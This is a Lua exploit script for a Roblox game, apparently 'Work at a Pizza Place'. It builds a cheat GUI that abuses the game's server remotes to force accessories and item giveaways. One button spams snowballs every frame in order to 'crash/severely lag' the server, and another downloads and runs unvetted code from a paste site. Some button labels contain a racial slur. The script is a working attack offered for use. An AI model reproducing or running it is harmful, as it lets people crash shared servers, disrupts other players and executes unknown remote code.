pcall(function()
    -- Made by SMUG#0558
    -- GUI library made by shidemuri on github (I stole from Pendulum Hub LOL)
    -- This script was made so I could have all the scripts I use (and scripts my friends use) in one GUI
    
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/shidemuri/scripts/main/ui_lib.lua"))()
    local Pendulum = Library:New("work at a pizza place fucker")
    
    local hats = Pendulum:NewTab("hats/broken accessories (FE)")
    
    hats:NewButton("c00lkid skybox", "omg!! real team c00lkid", function()
        local args = {
            [1] = "LoadAvatarAsset",
            [2] = 17901187190,
            [3] = "HatAccessory"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args))
    end)
    
    hats:NewButton("groomer nigga", "the best rapper", function()
        local args = {
            [1] = "LoadAvatarAsset",
            [2] = 18102194645,
            [3] = "HatAccessory"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args))
    end)
    
    hats:NewButton("capybara", "omg!! real capybara!!!", function()
        local args = {
            [1] = "LoadAvatarAsset",
            [2] = 18100760548,
            [3] = "HatAccessory"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args))
    end)
    
    hats:NewButton("galaxy (makes floor black)", "makes the floor black", function()
        local args = {
            [1] = "LoadAvatarAsset",
            [2] = 18100302612,
            [3] = "HatAccessory"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args))
    end)
    
    hats:NewButton("remove hats", "omg!! real remove hats!!!", function()
        local args = {
            [1] = "RemoveAvatarAsset",
            [2] = 18102194645,
            [3] = "HatAccessory"
        }
        local args1 = {
            [1] = "RemoveAvatarAsset",
            [2] = 17901187190,
            [3] = "HatAccessory"
        }
        local args2 = {
            [1] = "RemoveAvatarAsset",
            [2] = 18100760548,
            [3] = "HatAccessory"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args1))
        game:GetService("ReplicatedStorage"):WaitForChild("PlayerChannel"):FireServer(unpack(args2))
    end)
    
    
    
    local exploits = Pendulum:NewTab("exploits")
    
    exploits:NewButton("snowball exploit", "throws a shit ton of snowballs on click", function()
        
    local player = game.Players.LocalPlayer
    local backpack = player:WaitForChild("Backpack")
    local character = player.Character or player.CharacterAdded:Wait()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local playerChannel = replicatedStorage:WaitForChild("PlayerChannel")
    local runService = game:GetService("RunService")
    
    -- Function to give item and equip tools
    local function giveItemAndEquip()
        pcall(function()
            -- Fire the server to give the item
            local args = {
                [1] = "GiveItem",
                [2] = 19328185
            }
            playerChannel:FireServer(unpack(args))
            
            -- Equip all tools in the backpack
            for _, tool in ipairs(backpack:GetChildren()) do
                if tool:IsA("Tool") then
                    tool.Parent = character
                end
            end
        end)
    end
    
    -- Use RenderStepped for the infinite loop
    runService.RenderStepped:Connect(function()
        giveItemAndEquip()
        wait() -- Wait for a very short duration before running the loop again
    end)
    
    end)
    
    
    
    
    exploits:NewButton("snowball exploit (server lag/crasher)", "autospams snowball exploit to crash/serverely lag server", function()
        local player = game.Players.LocalPlayer
        local backpack = player:WaitForChild("Backpack")
        local character = player.Character or player.CharacterAdded:Wait()
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local playerChannel = replicatedStorage:WaitForChild("PlayerChannel")
        local runService = game:GetService("RunService")
    
        -- Function to give item and equip tools
        local function giveItemAndEquip()
            pcall(function()
                -- Fire the server to give the item
                local args = {
                    [1] = "GiveItem",
                    [2] = 19328185
                }
                playerChannel:FireServer(unpack(args))
                
                -- Equip all tools in the backpack
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool.Parent = character
                    end
                end
            end)
        end
    
        -- Function to fire Clicked RemoteEvent for all snowballs
        local function fireSnowballClicked()
            local args = {
                [1] = Vector3.new(42.43116760253906, 5.366636276245117, 90.57012176513672)
            }
            
            for _, tool in ipairs(character:GetChildren()) do
                if tool:IsA("Tool") and tool.Name == "Snowball" then
                    local clickedEvent = tool:FindFirstChild("Clicked")
                    if clickedEvent and clickedEvent:IsA("RemoteEvent") then
                        clickedEvent:FireServer(unpack(args))
                    end
                end
            end
        end
    
        -- Use RunService.Heartbeat for the infinite loop
        runService.Heartbeat:Connect(function()
            giveItemAndEquip()
            fireSnowballClicked()
            wait() -- Wait for a very short duration before running the loop again
        end)
    end)
    
    
    
    exploits:NewButton("earrape", ":333", function()
        loadstring(game:HttpGet("https://pastefy.app/AW864tt1/raw"))()
    end)
    
    
    
    
    
    end)